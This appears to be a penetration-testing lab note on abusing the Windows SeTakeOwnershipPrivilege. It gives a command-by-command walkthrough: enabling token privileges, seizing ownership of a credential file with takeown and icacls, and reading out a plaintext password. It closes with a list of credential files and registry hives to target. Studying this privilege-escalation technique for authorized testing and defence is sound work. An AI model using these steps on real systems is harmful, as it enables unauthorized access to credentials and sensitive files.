# SeTakeOwnershipPrivilege — Windows PrivEsc

## Background
- Grants ability to take ownership of **any securable object**: AD objects, NTFS files/folders, printers, registry keys, services, processes.
- Assigns **`WRITE_OWNER`** rights — the holder can change the owner field in an object's security descriptor.
- **Administrators have this by default.**
- Rare on standard user accounts, but often found on **service accounts** (e.g. backup/VSS snapshot jobs) — sometimes paired with `SeBackupPrivilege`, `SeRestorePrivilege`, `SeSecurityPrivilege` for granular control without granting full local admin.

### GPO Location
```
Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment
→ "Take ownership of files or other objects"
```
- Default: Administrators only. Microsoft's own guidance flags this as security-sensitive — assign to trusted users only.

### Abuse Angle
- Could be assigned to an attacker-controlled user via **GPO abuse** (e.g. `SharpGPOAbuse`) in an AD environment.
- Once held, enables taking control of shared folders/sensitive files — passwords, SSH keys, configs, etc.

---

## Exploitation Walkthrough

### Step 1 — Check current privileges
```powershell
whoami /priv
```
```
SeTakeOwnershipPrivilege   Take ownership of files or other objects   Disabled
```

### Step 2 — Enable the privilege
No native toggle —  We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.

```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```
```
SeTakeOwnershipPrivilege   ...   Enabled
```

### Step 3 — Identify a target file
Example scenario: browsing a company file share (`Private`/`Public` structure), find `cred.txt` under an `IT` subdirectory — readable listing, but `Access denied` on content.

**Check file details/owner:**
```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```
- If owner isn't shown → insufficient permissions to view details.

**Check directory ownership instead:**
```powershell
cmd /c dir /q 'C:\Department Shares\Private\IT'
```
- Reveals the directory (and file) is owned by a **service account** (e.g. `sccm_svc`).

### Step 4 — Take ownership of the file
```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```
```
SUCCESS: ... now owned by user "WINLPE-SRV01\htb-student".
```

**Confirm:**
```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

### Step 5 — Grant yourself read access via ACL
Ownership alone doesn't guarantee read access — the ACL still needs updating:
```powershell
cat 'C:\Department Shares\Private\IT\cred.txt'
# Access denied
```

```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

### Step 6 — Read the file
```powershell
cat 'C:\Department Shares\Private\IT\cred.txt'
```
```
NIX01 admin
root:n1X_p0wer_us3er!
```

---

## ⚠️ Important Cautions
- Changing ownership is a **destructive, hard-to-revert action** — especially for files nested in subdirectories with cascading permission changes.
- **Never do this on live/critical files** (e.g. a production `web.config`) without explicit client consent.
- Always attempt to **revert ownership/permissions** afterward.
- If reverting isn't possible, **document thoroughly** in the report and notify the client.
- Some clients prefer you **document the exploitable misconfiguration without actually exploiting it**, given the potential impact — clarify expectations beforehand.

---

## Files of Interest (Common Targets)

```
c:\inetpub\wwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

Also worth hunting for:
- `.kdbx` (KeePass databases)
- OneNote notebooks
- `passwords.*`, `pass.*`, `creds.*` files
- Scripts and configuration files
- Virtual hard drive files (`.vhd`/`.vhdx`)

---

## Key Takeaway
`SeTakeOwnershipPrivilege` is an edge-case but powerful privilege: **take ownership → adjust ACL via `icacls` → read/modify the target object.** Most useful for accessing sensitive files blocked by strict permissions (e.g. on file shares), but requires careful handling due to its destructive, hard-to-cleanly-revert nature.